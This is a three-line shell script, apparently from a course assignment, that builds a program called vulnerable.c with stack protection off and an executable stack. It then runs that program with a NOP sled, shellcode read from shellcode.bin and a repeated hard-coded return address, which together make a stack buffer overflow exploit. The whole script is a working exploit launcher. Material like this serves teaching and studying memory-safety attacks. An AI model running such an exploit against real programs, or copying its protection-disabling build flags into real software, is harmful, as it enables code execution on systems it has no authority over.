#!/bin/sh
gcc -g -Wall -fno-stack-protector -z execstack -o a3.out vulnerable.c;
./a3.out `perl -e 'print "\x90"x3'``cat shellcode.bin``perl -e 'print "\x70\x11\xe6\xb7"x10'`;

